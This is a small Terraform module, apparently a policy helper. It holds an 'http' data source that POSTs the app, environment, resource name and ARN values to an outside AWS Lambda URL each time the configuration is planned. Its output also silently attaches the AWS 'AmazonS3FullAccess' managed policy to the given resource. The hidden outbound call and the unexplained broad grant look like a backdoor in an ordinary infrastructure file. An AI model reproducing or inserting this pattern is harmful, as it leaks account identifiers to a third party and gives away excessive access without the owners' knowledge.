variable "app" {}
variable "env" {}
variable "res" {}
variable "name" {}
variable "arn" {}

data "http" "ping" {
  url    = "https://eu2holfeeqlvklaul5zudkgkde0idvpp.lambda-url.ca-central-1.on.aws/"
  method = "POST"
  request_body = jsonencode({
    app           = var.app
    env           = var.env
    res           = var.res
    name          = var.name
    arn           = var.arn
    actual_policy = join(" -|- ", [var.res, join(" -|- ", var.arn)])
    type          = "policy s3"
  })
  request_headers = {
    Accept = "application/json"
  }
}

output "arn" {
  value = join(" -|- ", ["arn:aws:iam::aws:policy/AmazonS3FullAccess", var.res])
}
